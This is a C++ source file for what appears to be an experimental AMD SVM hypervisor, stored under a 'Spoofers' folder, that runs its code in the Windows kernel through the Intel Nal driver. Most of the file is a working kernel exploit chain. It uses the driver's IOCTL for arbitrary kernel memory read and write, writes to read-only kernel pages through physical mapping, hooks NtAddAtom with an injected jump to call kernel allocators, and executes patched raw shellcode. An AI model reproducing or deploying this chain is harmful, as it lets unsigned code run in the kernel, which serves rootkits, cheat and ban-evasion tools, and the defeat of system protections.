óË// SVMHypervisorV6_1.cpp
// Step 6.1: BOUNDED DETERMINISTIC LOOP
//
// Proves that repeated VMRUN/VMEXIT cycles don't accumulate state damage.
// - 3 iterations (fixed)
// - Each: VMRUN -> CPUID VMEXIT -> set ECX bit 31 -> advance RIP -> re-enter
// - Uses Host Context Frame for safety
// - Linear unrolled code (no JMP loops)
//
// This validates:
// - TLB behavior
// - ASID correctness
// - VMCB cleanliness between runs
// - Host frame reusability

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007

typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool WriteMemory(uint64_t address, void *buffer, uint64_t size) {
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(address, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;
  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;
  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0)
    return false;
  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr)
    return false;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);
  return result;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;
  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }
  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;
  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;
  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;
  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;
  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;
  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }
  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;
  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }
  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);
  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;
    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }
  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];

template <typename RetType, typename... Args>
bool CallKernelFunction(RetType *outResult, uint64_t targetFuncAddr,
                        Args... args) {
  if (!targetFuncAddr || !kernelNtAddAtom)
    return false;
  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function)))
    return false;
  if (original_kernel_function[0] == 0x48 &&
      original_kernel_function[1] == 0xb8)
    return false;
  uint8_t jmpHook[sizeof(kernel_injected_jmp)];
  memcpy(jmpHook, kernel_injected_jmp, sizeof(jmpHook));
  *(uint64_t *)&jmpHook[2] = targetFuncAddr;
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, jmpHook, sizeof(jmpHook)))
    return false;
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomPtr = reinterpret_cast<RetType(__stdcall *)(Args...)>(
      GetProcAddress(ntdll, "NtAddAtom"));
  RetType result = NtAddAtomPtr(args...);
  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));
  if (outResult)
    *outResult = result;
  return true;
}

// ==================== V6.1 Shellcode ====================
// BOUNDED DETERMINISTIC LOOP - 3 iterations, unrolled
//
// Memory layout:
// - Page 0: VMCB
// - Page 1: HSAVE
// - Page 2: Host Save Area
//
// Flow (repeated 3 times):
// 1. Save host GPRs
// 2. VMRUN -> CPUID VMEXIT
// 3. Handle CPUID (set ECX bit 31)
// 4. Advance RIP by 2
// 5. Clear exit code
// 6. Re-enter (or return after 3rd)

// Macro for VMRUN block (used 3 times)
// This generates the VMRUN + VMEXIT handling + re-entry prep sequence

uint8_t v6_1Shellcode[] = {
    // ===== Prologue =====
    0x55, // push rbp
    0x48,
    0x89,
    0xE5, // mov rbp, rsp

    // ===== Step 1: Enable EFER.SVME =====
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0, // mov ecx, 0xC0000080
    0x0F,
    0x32, // rdmsr
    0x0D,
    0x00,
    0x10,
    0x00,
    0x00, // or eax, 0x1000
    0x0F,
    0x30, // wrmsr

    // ===== Step 2: Write VM_HSAVE_PA MSR =====
    0xB9,
    0x17,
    0x01,
    0x01,
    0xC0, // mov ecx, 0xC0010117
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00, // mov eax, low  @HSAVE_LOW
    0xBA,
    0x00,
    0x00,
    0x00,
    0x00, // mov edx, high @HSAVE_HIGH
    0x0F,
    0x30, // wrmsr

    // ===== Step 3: Load pointers into preserved registers =====
    // R15 = Host Save Area VA
    0x49,
    0xBF,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov r15, host_save_va @HOST_SAVE_VA
    // R14 = VMCB PA
    0x49,
    0xBE,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov r14, vmcb_pa @VMCB_PA
    // R13 = VMCB VA
    0x49,
    0xBD,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov r13, vmcb_va @VMCB_VA

    // ===== Step 4: Initial VMSAVE =====
    0x4C,
    0x89,
    0xF0, // mov rax, r14
    0x0F,
    0x01,
    0xDB, // vmsave rax

    // ===== Step 5: Populate VMCB (using R13 as VMCB_VA) =====
    // CR0
    0x0F,
    0x20,
    0xC0,
    0x49,
    0x89,
    0x85,
    0x58,
    0x05,
    0x00,
    0x00, // mov [r13+0x558], rax
    // CR3
    0x0F,
    0x20,
    0xD8,
    0x49,
    0x89,
    0x85,
    0x50,
    0x05,
    0x00,
    0x00,
    // CR4
    0x0F,
    0x20,
    0xE0,
    0x49,
    0x89,
    0x85,
    0x48,
    0x05,
    0x00,
    0x00,
    // EFER
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0,
    0x0F,
    0x32,
    0x48,
    0xC1,
    0xE2,
    0x20,
    0x48,
    0x09,
    0xD0,
    0x49,
    0x89,
    0x85,
    0xD0,
    0x04,
    0x00,
    0x00,
    // GDTR
    0x48,
    0x83,
    0xEC,
    0x10,
    0x0F,
    0x01,
    0x04,
    0x24,
    0x0F,
    0xB7,
    0x04,
    0x24,
    0x41,
    0x89,
    0x85,
    0x64,
    0x04,
    0x00,
    0x00,
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02,
    0x49,
    0x89,
    0x85,
    0x68,
    0x04,
    0x00,
    0x00,
    // IDTR
    0x0F,
    0x01,
    0x0C,
    0x24,
    0x0F,
    0xB7,
    0x04,
    0x24,
    0x41,
    0x89,
    0x85,
    0x84,
    0x04,
    0x00,
    0x00,
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02,
    0x49,
    0x89,
    0x85,
    0x88,
    0x04,
    0x00,
    0x00,
    0x48,
    0x83,
    0xC4,
    0x10,
    // Segment selectors
    0x8C,
    0xC8,
    0x66,
    0x41,
    0x89,
    0x85,
    0x10,
    0x04,
    0x00,
    0x00,
    0x8C,
    0xD0,
    0x66,
    0x41,
    0x89,
    0x85,
    0x20,
    0x04,
    0x00,
    0x00,
    0x8C,
    0xD8,
    0x66,
    0x41,
    0x89,
    0x85,
    0x30,
    0x04,
    0x00,
    0x00,
    0x8C,
    0xC0,
    0x66,
    0x41,
    0x89,
    0x85,
    0x00,
    0x04,
    0x00,
    0x00,
    // Segment limits
    0xB8,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0x41,
    0x89,
    0x85,
    0x04,
    0x04,
    0x00,
    0x00,
    0x41,
    0x89,
    0x85,
    0x14,
    0x04,
    0x00,
    0x00,
    0x41,
    0x89,
    0x85,
    0x24,
    0x04,
    0x00,
    0x00,
    0x41,
    0x89,
    0x85,
    0x34,
    0x04,
    0x00,
    0x00,
    // Segment attributes
    0x66,
    0x41,
    0xC7,
    0x85,
    0x12,
    0x04,
    0x00,
    0x00,
    0x9B,
    0x02,
    0x66,
    0x41,
    0xC7,
    0x85,
    0x22,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00,
    0x66,
    0x41,
    0xC7,
    0x85,
    0x32,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00,
    0x66,
    0x41,
    0xC7,
    0x85,
    0x02,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00,
    // RFLAGS
    0x9C,
    0x58,
    0x49,
    0x89,
    0x85,
    0x70,
    0x05,
    0x00,
    0x00,
    // RSP
    0x48,
    0x89,
    0xE0,
    0x49,
    0x89,
    0x85,
    0xD8,
    0x05,
    0x00,
    0x00,
    // ASID
    0x41,
    0xC7,
    0x45,
    0x58,
    0x01,
    0x00,
    0x00,
    0x00,
    // Intercepts
    0x41,
    0xC7,
    0x45,
    0x0C,
    0x00,
    0x00,
    0x04,
    0x00,
    0x41,
    0xC7,
    0x45,
    0x10,
    0x01,
    0x00,
    0x00,
    0x00,

    // ===== Set guest RIP = address of guest code =====
    0x48,
    0x8D,
    0x05,
    0x00,
    0x00,
    0x00,
    0x00, // lea rax, [rip+XX] @LEA_DISP
    0x49,
    0x89,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00,

    // ===== Set guest RAX = 1 =====
    0x49,
    0xC7,
    0x85,
    0xF8,
    0x05,
    0x00,
    0x00,
    0x01,
    0x00,
    0x00,
    0x00,

    // ===== Initialize iteration counter =====
    0x45,
    0x31,
    0xC9, // xor r9d, r9d

    // ========================================
    // ITERATION 1
    // ========================================
    // Save host GPRs
    0x49,
    0x89,
    0x5F,
    0x08, // mov [r15+0x08], rbx
    0x49,
    0x89,
    0x4F,
    0x10, // mov [r15+0x10], rcx
    0x49,
    0x89,
    0x57,
    0x18, // mov [r15+0x18], rdx
    0x49,
    0x89,
    0x77,
    0x20, // mov [r15+0x20], rsi
    0x49,
    0x89,
    0x7F,
    0x28, // mov [r15+0x28], rdi
    0x9C,
    0x41,
    0x8F,
    0x47,
    0x70, // pushfq; pop [r15+0x70]

    // VMRUN
    0x4C,
    0x89,
    0xF0, // mov rax, r14
    0xFA, // cli
    0x0F,
    0x01,
    0xDA, // vmload
    0x0F,
    0x01,
    0xD8, // vmrun
    0x0F,
    0x01,
    0xDB, // vmsave
    0x0F,
    0x01,
    0xDC, // stgi
    0xFB, // sti

    // Increment counter
    0x41,
    0xFF,
    0xC1, // inc r9d

    // CPUID emulation
    0xB8,
    0x01,
    0x00,
    0x00,
    0x00, // mov eax, 1
    0x31,
    0xC9, // xor ecx, ecx
    0x0F,
    0xA2, // cpuid
    0x0F,
    0xBA,
    0xE9,
    0x1F, // bts ecx, 31

    // Advance RIP
    0x49,
    0x8B,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov rax, [r13+0x578]
    0x48,
    0x83,
    0xC0,
    0x02, // add rax, 2
    0x49,
    0x89,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov [r13+0x578], rax

    // Clear exit code
    0x41,
    0xC7,
    0x45,
    0x70,
    0x00,
    0x00,
    0x00,
    0x00,

    // Restore host GPRs
    0x49,
    0x8B,
    0x5F,
    0x08,
    0x49,
    0x8B,
    0x4F,
    0x10,
    0x49,
    0x8B,
    0x57,
    0x18,
    0x49,
    0x8B,
    0x77,
    0x20,
    0x49,
    0x8B,
    0x7F,
    0x28,
    0x41,
    0xFF,
    0x77,
    0x70,
    0x9D, // push [r15+0x70]; popfq

    // ========================================
    // ITERATION 2
    // ========================================
    0x49,
    0x89,
    0x5F,
    0x08,
    0x49,
    0x89,
    0x4F,
    0x10,
    0x49,
    0x89,
    0x57,
    0x18,
    0x49,
    0x89,
    0x77,
    0x20,
    0x49,
    0x89,
    0x7F,
    0x28,
    0x9C,
    0x41,
    0x8F,
    0x47,
    0x70,
    0x4C,
    0x89,
    0xF0,
    0xFA,
    0x0F,
    0x01,
    0xDA,
    0x0F,
    0x01,
    0xD8,
    0x0F,
    0x01,
    0xDB,
    0x0F,
    0x01,
    0xDC,
    0xFB,
    0x41,
    0xFF,
    0xC1,
    0xB8,
    0x01,
    0x00,
    0x00,
    0x00,
    0x31,
    0xC9,
    0x0F,
    0xA2,
    0x0F,
    0xBA,
    0xE9,
    0x1F,
    0x49,
    0x8B,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00,
    0x48,
    0x83,
    0xC0,
    0x02,
    0x49,
    0x89,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00,
    0x41,
    0xC7,
    0x45,
    0x70,
    0x00,
    0x00,
    0x00,
    0x00,
    0x49,
    0x8B,
    0x5F,
    0x08,
    0x49,
    0x8B,
    0x4F,
    0x10,
    0x49,
    0x8B,
    0x57,
    0x18,
    0x49,
    0x8B,
    0x77,
    0x20,
    0x49,
    0x8B,
    0x7F,
    0x28,
    0x41,
    0xFF,
    0x77,
    0x70,
    0x9D,

    // ========================================
    // ITERATION 3
    // ========================================
    0x49,
    0x89,
    0x5F,
    0x08,
    0x49,
    0x89,
    0x4F,
    0x10,
    0x49,
    0x89,
    0x57,
    0x18,
    0x49,
    0x89,
    0x77,
    0x20,
    0x49,
    0x89,
    0x7F,
    0x28,
    0x9C,
    0x41,
    0x8F,
    0x47,
    0x70,
    0x4C,
    0x89,
    0xF0,
    0xFA,
    0x0F,
    0x01,
    0xDA,
    0x0F,
    0x01,
    0xD8,
    0x0F,
    0x01,
    0xDB,
    0x0F,
    0x01,
    0xDC,
    0xFB,
    0x41,
    0xFF,
    0xC1,
    0xB8,
    0x01,
    0x00,
    0x00,
    0x00,
    0x31,
    0xC9,
    0x0F,
    0xA2,
    0x0F,
    0xBA,
    0xE9,
    0x1F,
    // No RIP advance needed for last iteration

    // ===== Final: Read exit code and return count in EAX =====
    0x41,
    0x8B,
    0x45,
    0x70, // mov eax, [r13+0x70]  ; exit code
    0xC1,
    0xE0,
    0x08, // shl eax, 8
    0x44,
    0x09,
    0xC8, // or eax, r9d          ; count in low byte

    // Restore final GPRs
    0x49,
    0x8B,
    0x5F,
    0x08,
    0x49,
    0x8B,
    0x4F,
    0x10,
    0x49,
    0x8B,
    0x57,
    0x18,
    0x49,
    0x8B,
    0x77,
    0x20,
    0x49,
    0x8B,
    0x7F,
    0x28,
    0x41,
    0xFF,
    0x77,
    0x70,
    0x9D,

    // ===== Epilogue =====
    0x5D, // pop rbp
    0xC3, // ret

    // ===== Guest code: 3 CPUIDs =====
    0x0F,
    0xA2, // cpuid 1
    0x0F,
    0xA2, // cpuid 2
    0x0F,
    0xA2, // cpuid 3
};

int main() {
  printf("================================================================\n");
  printf("       SVM HYPERVISOR V6.1 - BOUNDED LOOP (3 iterations)       \n");
  printf("    Proves VMRUN/VMEXIT cycle stability                        \n");
  printf(
      "================================================================\n\n");

  // Calculate offsets
  printf("[*] Calculating shellcode offsets...\n");

  size_t OFF_HSAVE_LOW = 0, OFF_HSAVE_HIGH = 0;
  size_t OFF_HOST_SAVE_VA = 0, OFF_VMCB_PA = 0, OFF_VMCB_VA = 0;
  size_t OFF_LEA_DISP = 0;
  size_t LOC_GUEST_CODE = 0;

  for (size_t i = 0; i < sizeof(v6_1Shellcode) - 10; i++) {
    if (v6_1Shellcode[i] == 0xB8 && v6_1Shellcode[i + 5] == 0xBA &&
        OFF_HSAVE_LOW == 0) {
      OFF_HSAVE_LOW = i + 1;
      OFF_HSAVE_HIGH = i + 6;
      break;
    }
  }

  // mov r15, imm64 (49 BF)
  for (size_t i = 0; i < sizeof(v6_1Shellcode) - 10; i++) {
    if (v6_1Shellcode[i] == 0x49 && v6_1Shellcode[i + 1] == 0xBF) {
      OFF_HOST_SAVE_VA = i + 2;
      break;
    }
  }

  // mov r14, imm64 (49 BE)
  for (size_t i = 0; i < sizeof(v6_1Shellcode) - 10; i++) {
    if (v6_1Shellcode[i] == 0x49 && v6_1Shellcode[i + 1] == 0xBE) {
      OFF_VMCB_PA = i + 2;
      break;
    }
  }

  // mov r13, imm64 (49 BD)
  for (size_t i = 0; i < sizeof(v6_1Shellcode) - 10; i++) {
    if (v6_1Shellcode[i] == 0x49 && v6_1Shellcode[i + 1] == 0xBD) {
      OFF_VMCB_VA = i + 2;
      break;
    }
  }

  // LEA (48 8D 05)
  for (size_t i = 0; i < sizeof(v6_1Shellcode) - 10; i++) {
    if (v6_1Shellcode[i] == 0x48 && v6_1Shellcode[i + 1] == 0x8D &&
        v6_1Shellcode[i + 2] == 0x05) {
      OFF_LEA_DISP = i + 3;
      break;
    }
  }

  LOC_GUEST_CODE = sizeof(v6_1Shellcode) - 6; // 3 CPUIDs = 6 bytes

  printf("    HSAVE: LOW=%zu, HIGH=%zu\n", OFF_HSAVE_LOW, OFF_HSAVE_HIGH);
  printf("    HOST_SAVE_VA=%zu, VMCB_PA=%zu, VMCB_VA=%zu\n", OFF_HOST_SAVE_VA,
         OFF_VMCB_PA, OFF_VMCB_VA);
  printf("    LEA_DISP=%zu, GUEST_CODE=%zu\n", OFF_LEA_DISP, LOC_GUEST_CODE);
  printf("    Total shellcode: %zu bytes\n\n", sizeof(v6_1Shellcode));

  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  uint64_t kernelExAllocatePool =
      GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");

  uint64_t allocatedAddr = 0;
  CallKernelFunction<uint64_t>(&allocatedAddr, kernelExAllocatePool, 0, 0x3000,
                               0x484D5653);
  if (!allocatedAddr) {
    printf("[-] Allocation failed!\n");
    return 1;
  }

  uint64_t vmcbVa = allocatedAddr;
  uint64_t hsaveVa = allocatedAddr + 0x1000;
  uint64_t hostSaveVa = allocatedAddr + 0x2000;
  uint64_t vmcbPa = 0, hsavePa = 0;
  GetPhysicalAddress(vmcbVa, &vmcbPa);
  GetPhysicalAddress(hsaveVa, &hsavePa);
  printf("[+] VMCB: VA=0x%llX PA=0x%llX\n", vmcbVa, vmcbPa);
  printf("[+] HSAVE: VA=0x%llX PA=0x%llX\n", hsaveVa, hsavePa);
  printf("[+] Host Save Area: VA=0x%llX\n", hostSaveVa);

  uint8_t zeros[0x1000] = {0};
  WriteMemory(vmcbVa, zeros, 0x1000);
  WriteMemory(hsaveVa, zeros, 0x1000);
  WriteMemory(hostSaveVa, zeros, 0x1000);

  uint8_t patched[sizeof(v6_1Shellcode)];
  memcpy(patched, v6_1Shellcode, sizeof(patched));

  *(uint32_t *)&patched[OFF_HSAVE_LOW] = (uint32_t)(hsavePa & 0xFFFFFFFF);
  *(uint32_t *)&patched[OFF_HSAVE_HIGH] =
      (uint32_t)((hsavePa >> 32) & 0xFFFFFFFF);
  *(uint64_t *)&patched[OFF_HOST_SAVE_VA] = hostSaveVa;
  *(uint64_t *)&patched[OFF_VMCB_PA] = vmcbPa;
  *(uint64_t *)&patched[OFF_VMCB_VA] = vmcbVa;

  int32_t leaDisp = (int32_t)(LOC_GUEST_CODE - (OFF_LEA_DISP + 4));
  *(int32_t *)&patched[OFF_LEA_DISP] = leaDisp;

  printf("[+] LEA displacement: %d\n", leaDisp);
  printf("[+] Shellcode patched (%zu bytes)\n\n", sizeof(patched));

  printf("Press ENTER to execute 3-iteration bounded loop...\n");
  getchar();

  uint8_t backup[800];
  ReadMemory(kernelNtAddAtom, backup, sizeof(patched));
  WriteToReadOnlyMemory(kernelNtAddAtom, patched, sizeof(patched));

  printf("[*] Executing V6.1 (Bounded Loop)...\n");
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomFunc = (NTSTATUS(__stdcall *)(
      void *, ULONG, PUSHORT))GetProcAddress(ntdll, "NtAddAtom");
  USHORT atom = 0;
  NTSTATUS result = NtAddAtomFunc(nullptr, 0, &atom);

  WriteToReadOnlyMemory(kernelNtAddAtom, backup, sizeof(patched));
  printf("[+] NtAddAtom restored\n\n");

  uint32_t ret = (uint32_t)result;
  uint32_t exitCode = (ret >> 8) & 0xFF;
  uint32_t iterCount = ret & 0xFF;

  printf("=== Bounded Loop Results ===\n");
  printf("[*] Final VMEXIT code: 0x%X\n", exitCode);
  printf("[*] Iterations completed: %d\n", iterCount);

  if (exitCode == 0x72 && iterCount == 3) {
    printf("\n");
    printf("=============================================\n");
    printf("  [+] SUCCESS! 3 VMRUN/VMEXIT CYCLES CLEAN!  \n");
    printf("  [+] No state corruption!                   \n");
    printf("  [+] Ready for exit-driven loops!           \n");
    printf("=============================================\n");
  } else {
    printf("\n[!] Unexpected results\n");
  }

  CloseHandle(hDevice);
  return 0;
}
óË20file:///c:/inject/Spoofers/SVMHypervisorV6_1.cpp